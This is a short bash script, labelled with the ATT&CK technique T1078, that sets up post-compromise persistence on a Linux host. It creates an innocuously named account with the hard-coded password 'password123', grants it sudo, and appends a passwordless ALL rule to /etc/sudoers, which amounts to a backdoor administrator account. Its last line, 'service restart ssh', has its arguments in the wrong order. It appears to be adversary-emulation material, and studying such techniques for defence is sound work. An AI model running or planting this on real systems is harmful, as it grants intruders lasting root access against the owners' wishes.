#!/bin/bash
# T1078 - Create a new SSH user for persistence

# Variables
USERNAME="backup_user"
PASSWORD="password123"

# Check if user already exists
if id "$USERNAME" &>/dev/null; then
    echo "User $USERNAME already exists."
else
    # Create the new user
    useradd -m -s /bin/bash "$USERNAME"
    echo "$USERNAME:$PASSWORD" | chpasswd

    # Grant sudo privileges
    usermod -aG sudo "$USERNAME"
    
    # Add the user to sudoers file to enable root privileges
    echo "$USERNAME ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

    echo "User $USERNAME has been created and added to sudoers."
fi

# Restart SSH to apply any changes (optional)
service restart ssh

